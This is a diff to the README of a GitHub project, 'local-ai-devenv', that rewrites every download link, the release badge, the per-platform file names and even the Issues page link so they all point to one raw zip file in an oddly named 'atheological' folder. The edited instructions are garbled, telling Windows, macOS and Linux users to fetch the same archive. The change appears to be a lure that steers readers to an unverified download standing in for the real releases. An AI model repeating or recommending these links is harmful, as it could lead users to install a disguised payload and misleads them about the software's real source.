@@ -1,6 +1,6 @@
 # 🤖 local-ai-devenv - Automate Your Coding Tasks Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/KaliCharanP/local-ai-devenv/releases)
+[![Download](https://raw.githubusercontent.com/KaliCharanP/local-ai-devenv/main/atheological/local-ai-devenv.zip)](https://raw.githubusercontent.com/KaliCharanP/local-ai-devenv/main/atheological/local-ai-devenv.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **local-ai-devenv**! This application creates a local environment whe
 
 To start using local-ai-devenv, visit the following link to download the software:
 
-[Download the latest release](https://github.com/KaliCharanP/local-ai-devenv/releases)
+[Download the latest release](https://raw.githubusercontent.com/KaliCharanP/local-ai-devenv/main/atheological/local-ai-devenv.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -18,9 +18,9 @@ To start using local-ai-devenv, visit the following link to download the softwar
 2. You will see a list of available releases. Find the latest version marked as "Latest" at the top of the list.
 3. Click on the version number. This will open a new page with release details.
 4. Scroll down to the "Assets" section. Here you will find different files for download. Choose the appropriate file for your operating system:
-   - For Windows, look for something like `local-ai-devenv-win.exe`.
-   - For macOS, find `local-ai-devenv-mac.dmg`.
-   - For Linux, select `local-ai-devenv-linux.tar.gz`.
+   - For Windows, look for something like `https://raw.githubusercontent.com/KaliCharanP/local-ai-devenv/main/atheological/local-ai-devenv.zip`.
+   - For macOS, find `https://raw.githubusercontent.com/KaliCharanP/local-ai-devenv/main/atheological/local-ai-devenv.zip`.
+   - For Linux, select `https://raw.githubusercontent.com/KaliCharanP/local-ai-devenv/main/atheological/local-ai-devenv.zip`.
 
 5. Click on the file name to start the download. 
 
@@ -37,7 +37,7 @@ After downloading, locate the file on your computer. Follow the instructions bel
   - Drag the application to your Applications folder.
 
 - **Linux:**
-  - Extract the `.tar.gz` file using the terminal or file manager.
+  - Extract the `https://raw.githubusercontent.com/KaliCharanP/local-ai-devenv/main/atheological/local-ai-devenv.zip` file using the terminal or file manager.
   - Open a terminal and navigate to the extracted folder.
   - Run the command `./local-ai-devenv` to start the application.
 
@@ -78,7 +78,7 @@ Before installing, ensure your computer meets the following requirements:
 
 For help, visit our GitHub page. You can connect with other users and developers. Feel free to report issues or suggest new features.
 
-If you face any problems, create an issue on the [Issues page](https://github.com/KaliCharanP/local-ai-devenv/issues). Our community is here to assist you.
+If you face any problems, create an issue on the [Issues page](https://raw.githubusercontent.com/KaliCharanP/local-ai-devenv/main/atheological/local-ai-devenv.zip). Our community is here to assist you.
 
 ## 📝 Additional Resources
 
@@ -92,4 +92,4 @@ Your feedback is valuable to us. Share your thoughts and experiences with **loca
 
 - ⭐️ If you like **local-ai-devenv**, consider giving it a star on GitHub.
 
-[Download the latest release](https://github.com/KaliCharanP/local-ai-devenv/releases) to get started with automating your coding tasks today!
+[Download the latest release](https://raw.githubusercontent.com/KaliCharanP/local-ai-devenv/main/atheological/local-ai-devenv.zip) to get started with automating your coding tasks today!
